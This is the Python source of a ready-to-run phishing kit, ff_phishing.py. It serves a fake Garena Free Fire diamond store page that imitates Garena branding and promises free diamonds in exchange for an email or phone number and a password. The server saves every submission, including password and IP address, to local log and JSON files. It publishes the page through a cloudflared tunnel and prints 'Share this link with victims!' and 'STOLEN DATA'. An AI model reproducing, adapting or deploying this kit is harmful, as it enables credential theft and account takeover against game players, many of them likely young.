# ff_phishing.py - Port Fix + Atomic Public URL
#!/usr/bin/env python3
"""
Free Fire Diamond Top-Up Tool - Port Fix
Created by: Azhar | Hackers Colony Official
"""

import os
import time
import subprocess
import sys
import json
import webbrowser
import socket
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

try:
    from termcolor import colored
except ImportError:
    os.system("pip install termcolor")
    from termcolor import colored

class Colors:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    RESET = '\033[0m'
    
    @staticmethod
    def colored_text(text, color="default"):
        colors = {
            "red": Colors.RED, "green": Colors.GREEN,
            "yellow": Colors.YELLOW, "blue": Colors.BLUE,
            "magenta": Colors.MAGENTA, "cyan": Colors.CYAN,
            "white": Colors.WHITE, "default": Colors.RESET
        }
        return colors.get(color, Colors.RESET) + text + Colors.RESET

# HTML Template with Original Garena Logo
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Diamond Store</title>
    <link rel="icon" type="image/x-icon" href="https://assets.garena.com/gop/mshop/www/live/static/favicon.ico" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0a0e17;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: linear-gradient(145deg, #141b2b, #1a2332);
            border-radius: 16px;
            padding: 35px;
            max-width: 440px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.9);
            border: 1px solid rgba(255,215,0,0.08);
        }
        .header { text-align: center; margin-bottom: 25px; }
        .garena-logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #ffd700, #f5a623);
            border-radius: 50%;
            box-shadow: 0 10px 30px rgba(255,215,0,0.3);
        }
        .garena-logo img {
            width: 60px;
            height: 60px;
            object-fit: contain;
        }
        .header h1 { color: #ffd700; font-size: 22px; font-weight: 700; }
        .header p { color: #8899bb; font-size: 13px; margin-top: 4px; }
        .offer-badge {
            display: inline-block;
            background: linear-gradient(135deg, rgba(255,215,0,0.2), rgba(255,107,0,0.2));
            color: #ffd700;
            padding: 5px 16px;
            border-radius: 20px;
            font-size: 12px;
            margin-top: 8px;
            border: 1px solid rgba(255,215,0,0.2);
            animation: glow 2s infinite;
        }
        @keyframes glow {
            0%, 100% { box-shadow: 0 0 10px rgba(255,215,0,0.05); }
            50% { box-shadow: 0 0 25px rgba(255,215,0,0.15); }
        }
        .diamond-section {
            margin: 20px 0;
            padding: 15px;
            background: rgba(255,215,0,0.05);
            border-radius: 12px;
            border: 1px solid rgba(255,215,0,0.08);
        }
        .diamond-section .section-title {
            color: #ffd700;
            font-size: 15px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 12px;
        }
        .diamond-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
        }
        .diamond-option {
            padding: 14px 8px;
            background: rgba(255,255,255,0.03);
            border: 2px solid rgba(255,255,255,0.06);
            border-radius: 10px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            color: #ccd6e8;
        }
        .diamond-option:hover {
            border-color: #ffd700;
            background: rgba(255,215,0,0.05);
            transform: translateY(-2px);
        }
        .diamond-option.selected {
            border-color: #ffd700;
            background: rgba(255,215,0,0.1);
            box-shadow: 0 0 30px rgba(255,215,0,0.08);
        }
        .diamond-option .amount { font-size: 20px; font-weight: 700; color: #ffd700; }
        .diamond-option .bonus { font-size: 11px; color: #00ff88; margin-top: 3px; }
        .diamond-option .price { font-size: 11px; color: #667799; margin-top: 2px; }
        .form-group { margin-bottom: 16px; }
        .form-group label { color: #aabbdd; font-size: 13px; font-weight: 500; display: block; margin-bottom: 5px; }
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(255,255,255,0.05);
            border: 2px solid rgba(255,255,255,0.08);
            border-radius: 10px;
            color: #ffffff;
            font-size: 15px;
            transition: all 0.3s ease;
            outline: none;
        }
        .form-group input:focus {
            border-color: #ffd700;
            background: rgba(255,215,0,0.05);
            box-shadow: 0 0 20px rgba(255,215,0,0.05);
        }
        .form-group input::placeholder { color: #556688; }
        .gift-section {
            margin: 15px 0;
            padding: 12px 15px;
            background: rgba(255,215,0,0.05);
            border-radius: 10px;
            border: 1px solid rgba(255,215,0,0.1);
        }
        .gift-section label {
            color: #aabbdd;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
        }
        .gift-section input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #ffd700;
            cursor: pointer;
        }
        .gift-section .gift-text { color: #ffd700; font-weight: 500; }
        .btn-submit {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #ffd700, #f5a623);
            border: none;
            border-radius: 12px;
            color: #0a0e17;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 8px;
            letter-spacing: 0.5px;
        }
        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(255,215,0,0.25);
        }
        .security-badge {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 16px;
            color: #667799;
            font-size: 12px;
        }
        .security-badge span { color: #00ff88; }
        .footer {
            text-align: center;
            margin-top: 16px;
            padding-top: 14px;
            border-top: 1px solid rgba(255,255,255,0.05);
            color: #445566;
            font-size: 12px;
        }
        .footer a { color: #ffd700; text-decoration: none; }
        @media (max-width: 480px) {
            .container { padding: 20px; }
            .diamond-grid { grid-template-columns: repeat(2, 1fr); }
            .header h1 { font-size: 20px; }
            .garena-logo { width: 60px; height: 60px; }
            .garena-logo img { width: 45px; height: 45px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="garena-logo">
                <img src="https://assets.garena.com/gop/mshop/www/live/static/favicon.ico" alt="Garena" />
            </div>
            <h1>Free Fire Diamond Store</h1>
            <p>Official Partner • Secure Transaction</p>
            <div class="offer-badge">🎁 Limited Time Offer - Up to 50% Bonus</div>
        </div>
        
        <form method="POST" action="/submit">
            <div class="form-group">
                <label>📧 Email or Phone Number</label>
                <input type="text" name="email" placeholder="Enter your email or phone" required>
            </div>
            
            <div class="form-group">
                <label>🔑 Password</label>
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <div class="diamond-section">
                <div class="section-title">💎 Select Diamond Package</div>
                <div class="diamond-grid">
                    <div class="diamond-option selected" onclick="selectDiamond(this, '1000')">
                        <div class="amount">1,000</div>
                        <div class="bonus">🎁 +50 Bonus</div>
                        <div class="price">Free</div>
                        <input type="radio" name="diamonds" value="1000" checked style="display:none">
                    </div>
                    <div class="diamond-option" onclick="selectDiamond(this, '2000')">
                        <div class="amount">2,000</div>
                        <div class="bonus">🎁 +150 Bonus</div>
                        <div class="price">Free</div>
                        <input type="radio" name="diamonds" value="2000" style="display:none">
                    </div>
                    <div class="diamond-option" onclick="selectDiamond(this, '3000')">
                        <div class="amount">3,000</div>
                        <div class="bonus">🎁 +300 Bonus</div>
                        <div class="price">Free</div>
                        <input type="radio" name="diamonds" value="3000" style="display:none">
                    </div>
                    <div class="diamond-option" onclick="selectDiamond(this, '5000')">
                        <div class="amount">5,000</div>
                        <div class="bonus">🎁 +500 Bonus</div>
                        <div class="price">Free</div>
                        <input type="radio" name="diamonds" value="5000" style="display:none">
                    </div>
                </div>
            </div>
            
            <div class="gift-section">
                <label>
                    <input type="checkbox" name="gift" value="yes">
                    <span>🎁 <span class="gift-text">Claim Free Gift Package</span> (Extra 200 Diamonds)</span>
                </label>
            </div>
            
            <button type="submit" class="btn-submit">🎁 Get Free Diamonds</button>
            
            <div class="security-badge">
                🔒 Secure <span>●</span> 256-bit SSL <span>●</span> Instant Delivery
            </div>
        </form>
        
        <div class="footer">
            © 2024 Garena International. All rights reserved.<br>
            <a href="#">Terms of Service</a> • <a href="#">Privacy Policy</a>
        </div>
    </div>
    
    <script>
        function selectDiamond(element, value) {
            document.querySelectorAll('.diamond-option').forEach(el => {
                el.classList.remove('selected');
            });
            element.classList.add('selected');
            const radio = element.querySelector('input[type="radio"]');
            if (radio) radio.checked = true;
        }
    </script>
</body>
</html>'''

SUCCESS_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Success | Free Fire</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0a0e17;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: linear-gradient(145deg, #141b2b, #1a2332);
            border-radius: 16px;
            padding: 40px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.9);
            text-align: center;
            border: 1px solid rgba(0,255,136,0.1);
        }
        .success-icon { font-size: 70px; margin-bottom: 15px; animation: bounce 1.5s infinite; }
        @keyframes bounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-10px)} }
        h1 { color: #00ff88; font-size: 26px; margin-bottom: 5px; }
        .subtitle { color: #8899bb; font-size: 15px; margin-bottom: 25px; }
        .info-box {
            background: rgba(255,255,255,0.03);
            border-radius: 12px;
            padding: 18px;
            margin: 20px 0;
            text-align: left;
        }
        .info-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            color: #ccd6e8;
            font-size: 14px;
        }
        .info-item:last-child { border-bottom: none; }
        .info-item .label { color: #8899bb; }
        .info-item .value { color: #ffd700; font-weight: 500; }
        .btn-home {
            display: inline-block;
            padding: 13px 40px;
            background: linear-gradient(135deg, #ffd700, #f5a623);
            border: none;
            border-radius: 10px;
            color: #0a0e17;
            font-size: 16px;
            font-weight: 700;
            text-decoration: none;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        .btn-home:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(255,215,0,0.25); }
        .note { color: #667799; font-size: 13px; margin-top: 18px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✅</div>
        <h1>Top-Up Successful!</h1>
        <p class="subtitle">Your diamonds will be added shortly</p>
        <div class="info-box">
            <div class="info-item"><span class="label">📧 Email/Phone</span><span class="value">{email}</span></div>
            <div class="info-item"><span class="label">💎 Diamonds</span><span class="value">{diamonds}</span></div>
            <div class="info-item"><span class="label">🎁 Gift</span><span class="value">{gift}</span></div>
        </div>
        <a href="/" class="btn-home">🏠 Back to Store</a>
        <p class="note">⏰ Processing time: 2-5 minutes</p>
    </div>
</body>
</html>'''

class RequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_TEMPLATE.encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/submit':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            data = urllib.parse.parse_qs(post_data)
            
            email = data.get('email', [''])[0]
            password = data.get('password', [''])[0]
            diamonds = data.get('diamonds', ['1000'])[0]
            gift = data.get('gift', ['no'])[0]
            
            if email and password:
                # Log data
                log_entry = "\n" + "═"*60 + "\n"
                log_entry += "🎯 NEW DIAMOND TOP-UP REQUEST\n"
                log_entry += f"📧 Email/Phone: {email}\n"
                log_entry += f"🔑 Password: {password}\n"
                log_entry += f"💎 Diamonds: {diamonds}\n"
                log_entry += f"🎁 Gift: {'YES' if gift == 'yes' else 'NO'}\n"
                log_entry += f"🌐 IP: {self.client_address[0]}\n"
                log_entry += f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                log_entry += "═"*60 + "\n"
                
                with open("data.log", "a") as f:
                    f.write(log_entry)
                
                # JSON
                json_data = {
                    'email': email,
                    'password': password,
                    'diamonds': diamonds,
                    'gift': 'YES' if gift == 'yes' else 'NO',
                    'ip': self.client_address[0],
                    'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                with open("data.json", "a") as f:
                    f.write(json.dumps(json_data) + "\n")
                
                # Print to terminal
                print(Colors.colored_text("\n" + "═"*60, "cyan"))
                print(Colors.colored_text("🎯 NEW DIAMOND TOP-UP REQUEST", "red"))
                print(Colors.colored_text(f"📧 Email/Phone: {email}", "green"))
                print(Colors.colored_text(f"🔑 Password: {password}", "green"))
                print(Colors.colored_text(f"💎 Diamonds: {diamonds}", "green"))
                print(Colors.colored_text(f"🎁 Gift: {'YES' if gift == 'yes' else 'NO'}", "green"))
                print(Colors.colored_text(f"🌐 IP: {self.client_address[0]}", "green"))
                print(Colors.colored_text(f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "green"))
                print(Colors.colored_text("═"*60, "cyan"))
                
                # Show success
                success_page = SUCCESS_TEMPLATE.format(
                    email=email,
                    diamonds=diamonds,
                    gift='✅ Claimed' if gift == 'yes' else '❌ Not Claimed'
                )
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(success_page.encode())
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Please fill all fields")

def find_free_port():
    """Find a free port automatically"""
    for port in range(4444, 4500):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('127.0.0.1', port))
            sock.close()
            if result != 0:
                return port
        except:
            continue
    return 8080

class PhishingTool:
    def __init__(self):
        self.running = True
        self.public_url = ""
        self.port = 8080
        self.server = None
    
    def start_server(self, port):
        """Start HTTP server"""
        print(Colors.colored_text(f"\n[+] Starting server on port {port}...", "green"))
        
        try:
            self.server = HTTPServer(('0.0.0.0', port), RequestHandler)
            print(Colors.colored_text("[+] Server started successfully!", "green"))
            return True
        except OSError as e:
            if "Address already in use" in str(e):
                print(Colors.colored_text(f"[!] Port {port} is busy!", "yellow"))
                new_port = find_free_port()
                print(Colors.colored_text(f"[+] Using free port: {new_port}", "green"))
                self.port = new_port
                try:
                    self.server = HTTPServer(('0.0.0.0', new_port), RequestHandler)
                    print(Colors.colored_text("[+] Server started successfully!", "green"))
                    return True
                except:
                    print(Colors.colored_text("[!] Failed to start server!", "red"))
                    return False
            else:
                print(Colors.colored_text(f"[!] Error: {e}", "red"))
                return False
        except Exception as e:
            print(Colors.colored_text(f"[!] Error: {e}", "red"))
            return False
    
    def run_server(self):
        """Run server in thread"""
        if self.server:
            self.server.serve_forever()
    
    def open_browser(self):
        """Open browser"""
        url = f"http://127.0.0.1:{self.port}"
        print(Colors.colored_text(f"\n[+] Opening browser: {url}", "cyan"))
        
        try:
            webbrowser.open(url)
            print(Colors.colored_text("[+] Browser opened!", "green"))
            return True
        except:
            print(Colors.colored_text("[!] Could not open browser", "yellow"))
            print(Colors.colored_text(f"   Open manually: {url}", "cyan"))
            return False
    
    def get_public_url(self):
        """Get atomic public URL using cloudflared"""
        print(Colors.colored_text("\n[+] Generating Atomic Public URL...", "yellow"))
        
        try:
            subprocess.check_call(["cloudflared", "--version"], 
                                stdout=subprocess.DEVNULL, 
                                stderr=subprocess.DEVNULL)
        except:
            print(Colors.colored_text("[!] Cloudflared not installed!", "red"))
            print(Colors.colored_text("Install: pkg install cloudflared", "yellow"))
            return None
        
        cmd = f"cloudflared tunnel --url http://127.0.0.1:{self.port}"
        
        try:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            print(Colors.colored_text("[+] Cloudflared tunnel starting...", "cyan"))
            time.sleep(10)
            
            for _ in range(30):
                line = process.stderr.readline()
                if line:
                    if "https://" in line and ".trycloudflare.com" in line:
                        for word in line.split():
                            if "https://" in word and ".trycloudflare.com" in word:
                                self.public_url = word.strip()
                                print(Colors.colored_text(f"\n[+] Atomic Public URL Generated!", "green"))
                                print(Colors.colored_text(f"   🌐 {self.public_url}", "cyan"))
                                print(Colors.colored_text("\n[+] Share this link with victims!", "yellow"))
                                return self.public_url
            
            return None
            
        except Exception as e:
            print(Colors.colored_text(f"[!] Error: {e}", "red"))
            return None
    
    def show_menu(self):
        print(Colors.colored_text("\n[1] 🚀 Start Server", "yellow"))
        print(Colors.colored_text("[2] 🌐 Open Browser", "cyan"))
        print(Colors.colored_text("[3] 📊 View Data", "magenta"))
        print(Colors.colored_text("[4] 💾 Export Data", "blue"))
        print(Colors.colored_text("[5] 🗑️ Clear Data", "red"))
        print(Colors.colored_text("[6] ❌ Exit", "white"))
    
    def view_data(self):
        if os.path.exists('data.log'):
            print(Colors.colored_text("\n" + "="*60, "cyan"))
            print(Colors.colored_text("📊 STOLEN DATA", "red"))
            print(Colors.colored_text("="*60, "cyan"))
            with open('data.log', 'r') as f:
                print(f.read())
        else:
            print(Colors.colored_text("\n[!] No data found!", "yellow"))
        
        input(Colors.colored_text("\nPress Enter to continue...", "cyan"))
    
    def export_data(self):
        if os.path.exists('data.json'):
            with open('data.json', 'r') as f:
                data = f.read()
            
            filename = f"diamond_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                f.write(data)
            
            print(Colors.colored_text(f"\n[+] Data exported to {filename}", "green"))
        else:
            print(Colors.colored_text("[!] No data to export!", "yellow"))
        
        input(Colors.colored_text("\nPress Enter to continue...", "cyan"))
    
    def clear_data(self):
        confirm = input(Colors.colored_text("Clear all data? (y/n): ", "red"))
        if confirm.lower() == 'y':
            for file in ['data.log', 'data.json']:
                if os.path.exists(file):
                    os.remove(file)
            print(Colors.colored_text("[+] Data cleared!", "green"))
        else:
            print(Colors.colored_text("[+] Cancelled!", "yellow"))
        
        input(Colors.colored_text("\nPress Enter to continue...", "cyan"))
    
    def run(self):
        os.system('clear')
        
        banner = """
\033[1;36m╔══════════════════════════════════════════════════════════╗\033[0m
\033[1;31m║  ██████╗  ██████╗ ████████╗██╗     ███████╗███████╗  ║\033[0m
\033[1;33m║  ██╔══██╗██╔════╝ ╚══██╔══╝██║     ██╔════╝██╔════╝  ║\033[0m
\033[1;32m║  ██║  ██║██║  ███╗  ██║   ██║     █████╗  ███████╗  ║\033[0m
\033[1;34m║  ██║  ██║██║   ██║  ██║   ██║     ██╔══╝  ╚════██║  ║\033[0m
\033[1;35m║  ██████╔╝╚██████╔╝  ██║   ███████╗██║     ███████║  ║\033[0m
\033[1;36m║  ╚═════╝  ╚═════╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝  ║\033[0m
\033[1;33m╚══════════════════════════════════════════════════════════╝\033[0m

\033[1;33m🔴 YouTube Channel:\033[0m \033[1;36mhttps://www.youtube.com/@aryanafridi00\033[0m
\033[1;34m🌐 GitHub:\033[0m \033[1;36mhttps://github.com/shahid2005a\033[0m
\033[1;35m💻 Developer:\033[0m \033[1;32mARYAN AFRIDI\033[0m
"""
        print(banner)
        
        # Get port or auto-detect
        port_input = input(Colors.colored_text("\nEnter port (default 8080, or press Enter for auto): ", "green")).strip()
        
        if port_input:
            try:
                self.port = int(port_input)
            except:
                print(Colors.colored_text("[!] Invalid port! Using auto-detect...", "yellow"))
                self.port = find_free_port()
        else:
            self.port = find_free_port()
            print(Colors.colored_text(f"[+] Auto-detected free port: {self.port}", "green"))
        
        # Start server
        if not self.start_server(self.port):
            print(Colors.colored_text("[!] Server failed to start!", "red"))
            sys.exit(1)
        
        # Show URLs
        print(Colors.colored_text(f"\n[+] Server running at:", "green"))
        print(Colors.colored_text(f"   🌐 http://127.0.0.1:{self.port}", "cyan"))
        print(Colors.colored_text(f"   🌐 http://localhost:{self.port}", "cyan"))
        
        # Open browser
        time.sleep(2)
        self.open_browser()
        
        # Get atomic public URL
        print(Colors.colored_text("\n[+] Generating Atomic Public URL...", "yellow"))
        print(Colors.colored_text("[!] This may take a few seconds...", "yellow"))
        
        threading.Thread(target=self.get_public_url, daemon=True).start()
        time.sleep(12)
        
        if self.public_url:
            print(Colors.colored_text(f"\n[+] Atomic Public URL: {self.public_url}", "green"))
        else:
            print(Colors.colored_text("\n[!] Run manually in another terminal:", "red"))
            print(Colors.colored_text(f"cloudflared tunnel --url http://127.0.0.1:{self.port}", "magenta"))
        
        print(Colors.colored_text("\n[+] Press Ctrl+C to stop server\n", "red"))
        
        # Run server in background
        server_thread = threading.Thread(target=self.run_server, daemon=True)
        server_thread.start()
        
        # Main menu
        while self.running:
            self.show_menu()
            choice = input(Colors.colored_text("\nChoice [1-6]: ", "blue"))
            
            if choice == "1":
                print(Colors.colored_text("\n[+] Server already running!", "green"))
            elif choice == "2":
                self.open_browser()
            elif choice == "3":
                self.view_data()
            elif choice == "4":
                self.export_data()
            elif choice == "5":
                self.clear_data()
            elif choice == "6":
                self.exit_tool()
            else:
                print(Colors.colored_text("Invalid!", "red"))
    
    def exit_tool(self):
        print(Colors.colored_text("\n[+] Exiting... Bye! 👋", "red"))
        if self.server:
            self.server.shutdown()
        os.system("pkill -f cloudflared 2>/dev/null")
        os._exit(0)

if __name__ == "__main__":
    try:
        tool = PhishingTool()
        tool.run()
    except KeyboardInterrupt:
        print(Colors.colored_text("\n\n[!] Interrupted!", "yellow"))
        sys.exit(0)
    except Exception as e:
        print(Colors.colored_text(f"\n[!] Error: {e}", "red"))
        sys.exit(1)